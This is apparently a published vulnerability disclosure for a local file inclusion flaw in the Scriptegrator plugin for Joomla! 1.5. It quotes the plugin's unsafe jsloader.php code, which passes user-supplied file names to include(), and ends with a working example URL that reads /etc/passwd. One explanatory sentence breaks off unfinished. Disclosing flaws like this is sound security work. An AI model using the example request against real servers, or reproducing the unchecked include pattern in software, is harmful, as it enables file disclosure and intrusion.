Joomla Plugin Core Design Scriptegrator Local File Inclusion Vulnerability
==========================================================================


# Exploit Title: Core Design Scriptegrator plugin for Joomla! 1.5 file inclusion
# Author: S2 Crew [Hungary]
# Tested on: Debian Linux, Apache, Joomla! 1.5
 
# Code:
 
There&#039;s a file called jsloader.php which takes an array of file names
from the HTTP GET parameters and calls include() on every one of them.
 
-----------------8<-----------------------------------------------
<?php
/**
 * Core Design Scriptegrator plugin for Joomla! 1.5
 */
 
define(&#039;DS&#039;, DIRECTORY_SEPARATOR);
$dir = dirname(__FILE__);
 
$files = array();
if (isset($_GET[&#039;files&#039;]) && $_GET[&#039;files&#039;]) $files = $_GET[&#039;files&#039;];
 
 
header("Content-type: application/x-javascript");
header(&#039;Cache-Control: must-revalidate&#039;);
header(&#039;Expires: &#039; . gmdate(&#039;D, d M Y H:i:s&#039;, time() + 86400) . &#039; GMT&#039;);
 
foreach ($files as $file) {
        if (is_file($file)) {
                include($file);
                echo "\n";
        }
}
?>
-----------------8<-----------------------------------------------
 
The problem is that the only protection is the is_file() call (therefore it cannot
be used for remote file inclusion), so it&#039;s trivial to exploit this vulnerability to
 
Example:
http://server/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd




